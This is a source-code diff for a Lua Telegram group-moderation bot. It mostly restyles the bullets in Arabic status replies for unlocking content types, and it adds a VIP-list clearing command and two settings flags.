@@ -5869,14 +5572,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> arabic ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح العربيه `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح العربيه `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:arabic:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> arabic warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح العربيه` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح العربيه` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -5885,14 +5588,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> english has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الانكليزيه `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الانكليزيه `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:english:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> english is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الانكليزيه` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الانكليزيه` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5901,14 +5604,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> english ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الانكليزيه `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الانكليزيه `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:english:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> english ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الانكليزيه` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الانكليزيه` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -5917,14 +5620,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> english ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الانكليزيه `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الانكليزيه `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:english:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> english warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الانكليزيه` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الانكليزيه` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -5933,14 +5636,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> spam has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الكلايش `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الكلايش `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:spam:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> spam is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الكلايش` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الكلايش` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5949,14 +5652,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> spam ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الكلايش `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الكلايش `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:spam:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> spam warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الكلايش` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الكلايش` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -5965,14 +5668,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> sticker has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الملصقات `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الملصقات `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:sticker:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> sticker is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الملصقات` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الملصقات` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5981,14 +5684,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> sticker ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الملصقات `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الملصقات `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:sticker:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> sticker ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الملصقات` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الملصقات` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -5997,14 +5700,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> sticker ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الملصقات `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الملصقات `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:sticker:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> sticker warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الملصقات` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الملصقات` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
     end
@@ -6014,14 +5717,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> file has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الملفات `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الملفات `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:document:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> file is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الملفات` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الملفات` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -6030,14 +5733,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> file ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الملفات `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الملفات `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:document:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> file ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الملفات` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الملفات` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -6046,14 +5749,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> file ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الملفات `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الملفات `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:document:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> file warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الملفات` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الملفات` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end    
@@ -6063,14 +5766,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> markdown has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الماركدون `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الماركدون `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:markdown:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> markdown is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الماركدون` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الماركدون` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -6079,14 +5782,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> markdown ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الماركدون `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الماركدون `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:markdown:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> markdown ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الماركدون` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الماركدون` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -6095,14 +5798,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> markdown ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الماركدون `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الماركدون `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:markdown:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> markdown warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الماركدون` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الماركدون` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end    
@@ -6113,14 +5816,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> tgservice has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الاشعارات `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الاشعارات `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:tgservice:mute'..msg.chat_id_)
        else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> tgservice is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الاشعارات` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الاشعارات` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -6129,14 +5832,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> forward has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح التوجيه `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح التوجيه `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:forward:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> forward is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح التوجيه` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح التوجيه` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -6145,14 +5848,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> forward ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح التوجيه `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح التوجيه `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:forward:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> forward ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح التوجيه` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح التوجيه` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -6161,14 +5864,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> forward ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح التوجيه `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح التوجيه `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:forward:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> forward warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح التوجيه` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح التوجيه` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -6177,14 +5880,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> cmd has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الشارحه `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الشارحه `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:cmd:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> cmd is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الشارحه` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الشارحه` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -6193,14 +5896,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> cmd ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الشارحه `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الشارحه `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:cmd:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> cmd ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الشارحه` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الشارحه` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -6209,14 +5912,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> cmd ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الشارحه `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الشارحه `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:cmd:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> cmd warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الشارحه` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الشارحه` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -6229,7 +5932,7 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
 		 	          send(msg.chat_id_, msg.id_, 1, '*Done* _Edit My Msg_', 1, 'md')
 else 
-		 	          send(msg.chat_id_, msg.id_, 1, '● - `تم تعديل الرساله` ✔️📌', 1, 'md')
+		 	          send(msg.chat_id_, msg.id_, 1, '• `تم تعديل الرساله` ✔️📌', 1, 'md')
 end
     end
 	-----------------------------------------------------------------------------------------------
@@ -6237,7 +5940,7 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
       text = '_> Banall has been_ *Cleaned*'
     else 
-      text = '● - `تم مسح قائمه العام` ❌⚠️'
+      text = '• `تم مسح قائمه العام` ❌⚠️'
 end
       database:del('bot:gbanned:')
 	    send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
@@ -6247,7 +5950,7 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
       text = '_> adminlist has been_ *Cleaned*'
     else 
-      text = '● - `تم مسح قائمه ادمنيه البوت` ❌⚠️'
+      text = '• `تم مسح قائمه ادمنيه البوت` ❌⚠️'
 end
       database:del('bot:admins:')
 	    send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
@@ -6261,7 +5964,7 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
           send(msg.chat_id_, msg.id_, 1, '_> Banlist has been_ *Cleaned*', 1, 'md')
         else 
-          send(msg.chat_id_, msg.id_, 1, '● - `تم مسح قائمه المحظورين` ❌⚠️', 1, 'md')
+          send(msg.chat_id_, msg.id_, 1, '• `تم مسح قائمه المحظورين` ❌⚠️', 1, 'md')
 end
        end
 	   if txt[2] == 'bots' or txt[2] == 'Bots' or txt[2] == 'البوتات' then
@@ -6275,7 +5978,7 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
 	          send(msg.chat_id_, msg.id_, 1, '_> All bots_ *kicked!*', 1, 'md')
           else 
-          send(msg.chat_id_, msg.id_, 1, '● - `تم طرد جميع البوتات` ❌⚠️', 1, 'md')
+          send(msg.chat_id_, msg.id_, 1, '• `تم طرد جميع البوتات` ❌⚠️', 1, 'md')
 end
 	end
 	   if txt[2] == 'modlist' and is_owner(msg.sender_user_id_, msg.chat_id_) or txt[2] == 'Modlist' and is_owner(msg.sender_user_id_, msg.chat_id_) or txt[2] == 'الادمنيه' and is_owner(msg.sender_user_id_, msg.chat_id_) then
@@ -6283,7 +5986,15 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
           send(msg.chat_id_, msg.id_, 1, '_> Modlist has been_ *Cleaned*', 1, 'md')
       else 
-          send(msg.chat_id_, msg.id_, 1, '● - `تم مسح قائمه الادمنيه` ❌⚠️', 1, 'md')
+          send(msg.chat_id_, msg.id_, 1, '• `تم مسح قائمه الادمنيه` ❌⚠️', 1, 'md')
+end
+     end 
+	   if txt[2] == 'viplist' and is_owner(msg.sender_user_id_, msg.chat_id_) or txt[2] == 'Viplist' and is_owner(msg.sender_user_id_, msg.chat_id_) or txt[2] == 'الاعضاء المميزين' and is_owner(msg.sender_user_id_, msg.chat_id_) then
+	      database:del('bot:mods:'..msg.chat_id_)
+    if database:get('lang:gp:'..msg.chat_id_) then
+          send(msg.chat_id_, msg.id_, 1, '_> Viplist has been_ *Cleaned*', 1, 'md')
+      else 
+          send(msg.chat_id_, msg.id_, 1, '• `تم مسح قائمه الاعضاء المميزين` ❌⚠️', 1, 'md')
 end
        end 
 	   if txt[2] == 'owners' and is_sudo(msg) or txt[2] == 'Owners' and is_sudo(msg) or txt[2] == 'المدراء' and is_sudo(msg) then
@@ -6291,7 +6002,7 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
           send(msg.chat_id_, msg.id_, 1, '_> ownerlist has been_ *Cleaned*', 1, 'md')
         else 
-          send(msg.chat_id_, msg.id_, 1, '● - `تم مسح قائمه المدراء` ❌⚠️', 1, 'md')
+          send(msg.chat_id_, msg.id_, 1, '• `تم مسح قائمه المدراء` ❌⚠️', 1, 'md')
 end
        end
 	   if txt[2] == 'rules' or txt[2] == 'Rules' or txt[2] == 'القوانين' then
@@ -6299,7 +6010,7 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
           send(msg.chat_id_, msg.id_, 1, '_> rules has been_ *Cleaned*', 1, 'md')
         else 
-          send(msg.chat_id_, msg.id_, 1, '● - `تم مسح القوانين المحفوظه` ❌⚠️', 1, 'md')
+          send(msg.chat_id_, msg.id_, 1, '• `تم مسح القوانين المحفوظه` ❌⚠️', 1, 'md')
 end
        end
 	   if txt[2] == 'link' or  txt[2] == 'Link' or  txt[2] == 'الرابط' then
@@ -6307,7 +6018,7 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
           send(msg.chat_id_, msg.id_, 1, '_> link has been_ *Cleaned*', 1, 'md')
         else 
-          send(msg.chat_id_, msg.id_, 1, '● - `تم مسح الرابط المحفوظ` ❌⚠️', 1, 'md')
+          send(msg.chat_id_, msg.id_, 1, '• `تم مسح الرابط المحفوظ` ❌⚠️', 1, 'md')
 end
        end
 	   if txt[2] == 'badlist' or txt[2] == 'Badlist' or txt[2] == 'قائمه المنع' then
@@ -6315,7 +6026,7 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
           send(msg.chat_id_, msg.id_, 1, '_> badlist has been_ *Cleaned*', 1, 'md')
         else 
-          send(msg.chat_id_, msg.id_, 1, '● - `تم مسح قائمه المنع` ❌⚠️', 1, 'md')
+          send(msg.chat_id_, msg.id_, 1, '• `تم مسح قائمه المنع` ❌⚠️', 1, 'md')
 end
        end
 	   if txt[2] == 'silentlist' or txt[2] == 'Silentlist' or txt[2] == 'المكتومين' then
@@ -6323,7 +6034,7 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
           send(msg.chat_id_, msg.id_, 1, '_> silentlist has been_ *Cleaned*', 1, 'md')
         else 
-          send(msg.chat_id_, msg.id_, 1, '● - `تم مسح قائمه المكتومين` ❌⚠️', 1, 'md')
+          send(msg.chat_id_, msg.id_, 1, '• `تم مسح قائمه المكتومين` ❌⚠️', 1, 'md')
 end
        end
        
@@ -6770,6 +6481,18 @@ end
 	else
 	lock_rep = '`مفعله | 🔓`'
 	end
+
+    if database:get('bot:rep:mute'..msg.chat_id_) then
+	lock_repsudo = '`معطله | 🔐`'
+	else
+	lock_repsudo = '`مفعله | 🔓`'
+	end
+
+    if database:get('bot:id:mute'..msg.chat_id_) then
+	lock_id = '`معطل | 🔐`'
+	else
+	lock_id = '`مفعل | 🔓`'
+	end
 	------------
 	if database:get("bot:welcome"..msg.chat_id_) then
 	send_welcome = '`مفعل | ✔`'
@@ -6794,41 +6517,43 @@ end
 				exp_dat = math.floor(ex / 86400) + 1
 			    end
  	------------
